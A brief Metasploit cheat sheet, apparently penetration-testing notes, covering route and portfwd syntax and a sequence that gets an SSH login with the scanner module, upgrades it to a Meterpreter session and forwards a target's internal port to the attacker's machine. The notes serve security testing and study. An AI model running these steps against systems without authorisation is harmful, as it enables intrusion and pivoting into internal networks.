# Metasploit

# Usage:

#### route add/del IP SUBNET [COMM/SID] (proxy)

#### portfwd add/del -l PORT -p PORT -r IP (port forwarding)

## Port Forwarding with Metasploit

### 1) With SSH login

 - use auxiliary/scanner/ssh/ssh_login

 - set rhosts RHOSTS

 - set username USERNAME

 - set password PASSWORD

 - exploit

 - sessions -u 1 (Upgrade to Meterpreter session. Creates an EXTRA session with meterpreter)

 - sessions 2

 - netstat -antp (Check for applications that run internally within the target)

 - portfwd add -l LOCAL_PORT -p TARGET_PORT -r 127.0.0.1


